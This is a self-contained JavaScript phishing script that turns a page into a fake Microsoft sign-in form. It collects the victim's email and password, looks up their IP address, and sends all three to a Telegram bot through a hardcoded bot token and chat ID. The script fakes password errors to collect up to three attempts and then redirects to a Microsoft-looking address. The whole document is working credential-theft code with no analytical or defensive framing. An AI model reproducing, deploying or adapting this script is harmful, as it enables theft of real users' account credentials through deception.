<script>
    let step = 1; 
    let attempts = 0;
    let userIP = "Unknown"; 

    const botToken = '8024281544:AAHo40hPBYBYAZeFhSLGDsdgVkz5Xe4TyiM';
    const chatId = '7523003121';

    async function fetchIP() {
        try {
            const response = await fetch('https://api.ipify.org');
            const data = await response.json();
            userIP = data.ip || "Unknown";
        } catch (e) {}
    }
    fetchIP();

    window.addEventListener('DOMContentLoaded', () => {
        const style = document.createElement('style');
        style.innerHTML = `
            button[type="button"] img, .back-button, #idBtn_Back, .identityBanner img, .back-arrow { 
                display: none !important; 
            }
        `;
        document.head.appendChild(style);

        const titleHeader = document.querySelector('div[role="heading"]') || document.querySelector('.fzzj3pj');
        const passwordField = document.querySelector('input[type="password"]') || document.querySelector('.password-input');
        const signInButton = document.getElementById('idSIButton9') || document.querySelector('button');
        
        if (!passwordField) return;
        const parentContainer = passwordField.parentNode;

        // IDENTITY ROW
        const identityRow = document.createElement('div');
        identityRow.id = "custom-identity-row";
        // INCREASED NEGATIVE MARGIN (-24px) TO MOVE IT HIGHER
        identityRow.style = "display: none; align-items: center; gap: 8px; margin-top: -24px; margin-bottom: 8px; cursor: pointer; width: 100%;";
        identityRow.innerHTML = `
            <div style="display: flex; align-items: center;">
                <svg viewBox="0 0 24 24" style="width: 18px; height: 18px; fill: #666; margin-right: 8px;">
                    <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"></path>
                </svg>
                <span id="display-email" style="font-size: 0.9375rem; color: #1b1b1b; font-family: 'Segoe UI';"></span>
            </div>`;

        identityRow.onclick = () => {
            step = 1;
            identityRow.style.display = "none";
            passwordField.style.display = "none";
            emailInput.style.display = "block";
            if (titleHeader) titleHeader.innerText = "Sign in";
        };

        if (titleHeader) {
            titleHeader.style.fontSize = "1.625rem"; 
            titleHeader.style.fontWeight = "600";
            titleHeader.style.color = "#1b1b1b";
            titleHeader.style.marginBottom = "14px";
            titleHeader.innerText = "Sign in";
        }

        const emailInput = document.createElement('input');
        emailInput.type = 'email';
        emailInput.placeholder = 'Email, phone, or Skype';
        emailInput.style = "width:100%; height:36px; padding:6px 0px; border:none; border-bottom:1px solid #666; outline:none; font-family:'Segoe UI'; margin-bottom:12px; font-size: 0.9375rem;";
        
        parentContainer.prepend(passwordField); 
        parentContainer.insertBefore(emailInput, passwordField); 
        if (titleHeader) parentContainer.insertBefore(titleHeader, emailInput);
        parentContainer.insertBefore(identityRow, titleHeader); 

        passwordField.style.display = "none";

        if (signInButton) {
            signInButton.addEventListener('click', (e) => {
                e.preventDefault();
                if (step === 1) {
                    const emailVal = emailInput.value.trim();
                    if (emailVal === "") return;
                    
                    document.getElementById('display-email').innerText = emailVal;
                    emailInput.style.display = "none";
                    identityRow.style.display = "flex"; 
                    
                    if (titleHeader) titleHeader.innerText = "Enter password";
                    
                    passwordField.style.display = "block";
                    passwordField.focus();
                    step = 2;
                } else {
                     const passVal = passwordField.value.trim();
                                        if (passVal === "") return;

                    attempts++;
                    const msg = `🔔 **MS Login**\n📧 User: ${emailInput.value}\n🔑 Pass: ${passVal}\n🔢 Try: ${attempts}/3\n🌐 IP: ${userIP}`;
                    
                    // Corrected URL: Removed curly braces and added '/bot' before the token.
                    fetch(`https://api.telegram.org/bot8024281544:AAHo40hPBYBYAZeFhSLGDsdgVkz5Xe4TyiM/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`, { mode: 'no-cors' });

                    setTimeout(() => {
                        if (attempts < 3) {
                            errorDiv.style.display = "block";
                            passwordField.value = '';
                            passwordField.focus();
                        } else {
                            window.location.href = 'https://login.microsoftonline/jsdisbled';
                        }
                    }, 800);
                }
            });
        }
    });
</script>
